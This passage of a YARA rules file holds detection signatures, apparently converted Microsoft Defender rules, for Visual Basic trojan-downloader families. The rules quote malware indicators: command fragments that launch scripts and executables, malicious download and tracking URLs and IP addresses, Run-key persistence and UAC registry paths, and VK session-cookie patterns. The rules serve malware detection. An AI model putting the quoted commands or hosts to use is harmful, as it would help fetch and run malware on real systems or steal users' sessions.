        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "21"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {64 6f 77 6e 6c 6f 61 64 65 72 00 64 6f 77 6e 6c 6f 61 64 65 72 00 ?? 64 6f 77 6e 6c 6f 61 64 65 72}  //weight: 10, accuracy: Low
        $x_10_2 = "\\l\\Desktop\\lalalal2" wide //weight: 10
        $x_1_3 = "\\diffprj.wbp" wide //weight: 1
        $x_1_4 = "\\diffprj.vb" wide //weight: 1
        $x_1_5 = {5c 00 00 00 00 00 00 00 00 00 00 00 72 00 6a 00 2e 00 76 00 62 00 70}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_TN_2147652148_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.TN"
        threat_id = "2147652148"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "at = FalDownloader" ascii //weight: 1
        $x_1_2 = "snss.exe" wide //weight: 1
        $x_1_3 = "cmd.exe /c my.vbs" wide //weight: 1
        $x_1_4 = "ws.run \"cmd /c wlniogin.exe\",0,False " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_B_2147652874_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.gen!B"
        threat_id = "2147652874"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin" wide //weight: 2
        $x_4_2 = "cambiodeltiogggggggggggggggg" ascii //weight: 4
        $x_1_3 = "application/x-www-form-urlencoded" wide //weight: 1
        $x_2_4 = "\\TIOCARADEPENE\\Proyecto1.vbp" wide //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_TT_2147652964_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.TT"
        threat_id = "2147652964"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\windy\\Panda.exe" wide //weight: 1
        $x_1_2 = "C:\\windy\\Avast.exe" wide //weight: 1
        $x_1_3 = "C:\\windy\\Funcoes.dll" wide //weight: 1
        $x_1_4 = "Teste de encripctacao" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_UA_2147653418_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.UA"
        threat_id = "2147653418"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {75 72 6c 6d 6f 6e 00 00 13 00 00 00 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41}  //weight: 2, accuracy: High
        $x_1_2 = {85 d2 74 05 e9 15 01 00 00 c7 45 fc 07 00 00 00 ba ?? ?? ?? ?? 8d 4d c4 ff 15 ?? ?? ?? ?? ba ?? ?? ?? ?? 8d 4d c8 ff 15 ?? ?? ?? ?? 8d 45 90 50 8d 4d c4 51 8d 55 c8 52 8b 45 08 8b 08 8b 55 08 52 ff 91 f8 06 00 00}  //weight: 1, accuracy: Low
        $x_1_3 = {85 c0 74 05 e9 1e 01 00 00 c7 45 fc 08 00 00 00 ba ?? ?? ?? ?? 8d 4d b4 ff 15 ?? ?? ?? ?? ba ?? ?? ?? ?? 8d 4d b8 ff 15 ?? ?? ?? ?? 8d 4d 80 51 8d 55 b4 52 8d 45 b8 50 8b 4d 08 8b 11 8b 45 08 50 ff 92 f8 06 00 00}  //weight: 1, accuracy: Low
        $x_2_4 = "DowFile" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_UD_2147653929_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.UD"
        threat_id = "2147653929"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://" wide //weight: 1
        $x_1_2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" wide //weight: 1
        $x_1_3 = "uncode=" wide //weight: 1
        $x_1_4 = "&ccode=" wide //weight: 1
        $x_1_5 = "&mcode=" wide //weight: 1
        $x_1_6 = "&dsend=" wide //weight: 1
        $x_1_7 = "&bsend=" wide //weight: 1
        $x_1_8 = "&lcode=" wide //weight: 1
        $x_1_9 = "0B3F3AEE819B0711C7F08604AF322869D0BD7F331F658F404ED6057" wide //weight: 1
        $x_1_10 = "8534564A0B1A8A0684966300BC71B1F96007DA2CBBB5615C83AA417E8124CE1425B2D53A42A2E" wide //weight: 1
        $x_1_11 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_12 = "InternetGetConnectedState" ascii //weight: 1
        $x_1_13 = "MSVBVM60.DLL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (12 of ($x*))
}

rule TrojanDownloader_Win32_VB_UI_2147654596_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.UI"
        threat_id = "2147654596"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "tanchu8675" ascii //weight: 1
        $x_1_2 = "/cpm/10102/10194.jsp?s=11054&dm=2" wide //weight: 1
        $x_1_3 = "117.40.196.202/tj2/count.asp?ver=2.0&mac=" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_US_2147654714_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.US"
        threat_id = "2147654714"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "qupan.com_3850760_" ascii //weight: 1
        $x_1_2 = "c:\\yu.txt" wide //weight: 1
        $x_1_3 = "c:\\ggmm.exe" wide //weight: 1
        $x_1_4 = "/UBB/_vti_cnf/59.jpg" wide //weight: 1
        $x_1_5 = "lwsex.info/zc/tj2.html?" wide //weight: 1
        $x_1_6 = "keyyou.net/a-d.php?uid=" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_Win32_VB_YE_2147654845_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.YE"
        threat_id = "2147654845"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "AC:\\puxa\\lenda.vbp" wide //weight: 1
        $x_1_2 = "loader_roberx.exe" wide //weight: 1
        $x_1_3 = {4f 70 65 6e 48 54 54 50 [0-10] 43 6c 6f 73 65 48 54 54 50 [0-10] 53 65 6e 64 52 65 71 75 65 73 74 [0-10] 55 52 4c 45 6e 63 6f 64 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_UW_2147654873_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.UW"
        threat_id = "2147654873"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\\Application Data\\Microsoft\\CD Burning\\*" ascii //weight: 1
        $x_1_2 = "ben(.*?)end" wide //weight: 1
        $x_1_3 = "\\LOG.TXT" wide //weight: 1
        $x_1_4 = "Accept-Language: ru-ru,ru;q=0.8,en-us;" wide //weight: 1
        $x_1_5 = "//m.vk.com/" wide //weight: 1
        $x_1_6 = "cmd /c image.jpg" wide //weight: 1
        $x_1_7 = "/z.txt" wide //weight: 1
        $x_1_8 = "id=([0-9]+)," wide //weight: 1
        $x_1_9 = "d?([a-f0-9]{60})" wide //weight: 1
        $x_1_10 = "remixsid=" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_UZ_2147655316_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.UZ"
        threat_id = "2147655316"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "12"
        strings_accuracy = "High"
    strings:
        $x_10_1 = ".save21.pe.kr" wide //weight: 10
        $x_1_2 = "/act/downlist.asp?uncode=" wide //weight: 1
        $x_1_3 = "/act/exelistall.asp?uncode=" wide //weight: 1
        $x_1_4 = "/Bundle/Client/client_download_verlist.asp?vercode=" wide //weight: 1
        $x_1_5 = "/Bundle/Client/client_connect_ip.asp" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_VA_2147655326_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.VA"
        threat_id = "2147655326"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {89 41 0c 6a 01 6a 68 8b 4d 08 8b 11 8b 45 08 50 ff 92}  //weight: 1, accuracy: High
        $x_1_2 = {22 00 00 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 2e 00 58 00 4d 00 4c 00 48 00 54 00 54 00 50 00 00 00 06 00 00 00 47 00 45 00 54 00 00 00 4f 00 70 00 65 00 6e 00 00 00}  //weight: 1, accuracy: High
        $x_1_3 = {69 00 70 00 61 00 64 00 74 00 76 00 [0-4] 2e 00 61 00 71 00 67 00 73 00 69 00 2e 00 69 00 6e 00 66 00 6f 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_VC_2147655454_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.VC"
        threat_id = "2147655454"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "d.4755.cn:88/download.asp?uid=" wide //weight: 1
        $x_1_2 = "tian6m.3322.org" wide //weight: 1
        $x_1_3 = "system32\\wott.vbs" wide //weight: 1
        $x_1_4 = "C:\\WINDOWS\\logo81.exe" wide //weight: 1
        $x_1_5 = ".go6000.com" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_Win32_VB_VW_2147660182_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.VW"
        threat_id = "2147660182"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\" wide //weight: 1
        $x_1_2 = "http://flogger.awardspace.biz/net/" wide //weight: 1
        $x_1_3 = {28 00 00 00 4d 00 53 00 58 00 4d 00 4c 00 32 00 2e 00 53 00 65 00 72 00 76 00 65 00 72 00 58 00 4d 00 4c 00 48 00 54 00 54 00 50 00}  //weight: 1, accuracy: High
        $x_1_4 = {72 00 65 00 73 00 70 00 6f 00 6e 00 73 00 65 00 42 00 6f 00 64 00 79 00 00 00 00 00 77 00 72 00 69 00 74 00 65 00 00 00 53 00 61 00 76 00 65 00 54 00 6f 00 46 00 69 00 6c 00 65 00}  //weight: 1, accuracy: High
        $x_1_5 = "wscript.shell" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_YJ_2147712008_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.YJ!bit"
        threat_id = "2147712008"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        info = "bit: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2a 54 44 53 2a [0-16] 2a 54 44 53 2a}  //weight: 1, accuracy: Low
        $x_1_2 = {53 65 63 75 72 69 74 79 5f 44 6f 77 6e 6c 6f 61 64 65 72 00 73 6b 74 6f 00}  //weight: 1, accuracy: High
        $x_1_3 = "\\Security Downloader\\Security_Downloader.vbp" wide //weight: 1
        $x_1_4 = {8d 55 a4 8d 4d c4 c7 45 ac 80 17 40 00 c7 45 a4 08 00 00 00 e8 ?? ?? ff ff 56 8d 45 c4 6a ff 50 ff 75 e8 8d 45 b4 50 e8 ?? ?? ff ff}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_2147800056_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB"
        threat_id = "2147800056"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\\jiedian.exe" wide //weight: 1
        $x_1_2 = "\\DragonBox\\uninstall.exe" wide //weight: 1
        $x_1_3 = "count.qqkuyou.cn/gg.asp?key=" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_2147800056_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB"
        threat_id = "2147800056"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "*\\AC:\\Users\\SqUeEzEr\\Desktop\\OPENSC CODES FROM ME\\Downloader\\.vbp" wide //weight: 1
        $x_1_2 = "gsso9.." ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_2147800056_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB"
        threat_id = "2147800056"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "20"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "img001.com/guagua/GuaGua2010Beta2Setup1202_silence_2206001.exe" wide //weight: 10
        $x_10_2 = "img003.com/soft/GuaGua2010Beta2SetupGW_tg.exe" wide //weight: 10
        $x_10_3 = "img001.com/juxing55/juxing2011Setup0407_0.exe" wide //weight: 10
        $x_10_4 = "img003.com/soft/qixi55/Qixi2010Setup.exe" wide //weight: 10
        $x_10_5 = "img001.com/qiji55/Qiji2011Setup.exe" wide //weight: 10
        $x_5_6 = "hser.xiandai9.info:5267/tyss/contest.asp" wide //weight: 5
        $x_5_7 = "222.217.240.28:7160/tyss/contest.asp" wide //weight: 5
        $x_5_8 = "count.qqkuyou.cn/hh.asp?key=" wide //weight: 5
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 2 of ($x_5_*))) or
            ((2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_NH_2147802482_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.NH"
        threat_id = "2147802482"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Explorer\\Shell Folders" wide //weight: 1
        $x_1_2 = "tiwlbnapgjsp4qyzsylldu3ylv4rnvcr2wejder4py9rvmdc" wide //weight: 1
        $x_1_3 = "\\MsVersion.exe" wide //weight: 1
        $x_1_4 = "Tupdate" ascii //weight: 1
        $x_1_5 = "regRun" ascii //weight: 1
        $x_1_6 = "MSVBVM60.DLL" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_XH_2147804055_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.XH"
        threat_id = "2147804055"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "D:\\Master\\ADWARA" wide //weight: 1
        $x_1_2 = "http://liveupdatesnet.com/" wide //weight: 1
        $x_1_3 = "vmwareservice.exe" wide //weight: 1
        $x_1_4 = "transfer-encoding" wide //weight: 1
        $x_1_5 = "content-lenght" wide //weight: 1
        $x_1_6 = "ShellExecuteA" ascii //weight: 1
        $x_1_7 = "strRemoteHost" ascii //weight: 1
        $x_1_8 = "lngRemotePort" ascii //weight: 1
        $x_1_9 = "RemoteHostIP" ascii //weight: 1
        $x_1_10 = "\\nusrmgr.exe" wide //weight: 1
        $x_1_11 = "WinExec" ascii //weight: 1
        $x_1_12 = "\\1.exe" wide //weight: 1
        $x_1_13 = "\\2.exe" wide //weight: 1
        $x_1_14 = "IsVmWare" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (11 of ($x*))
}

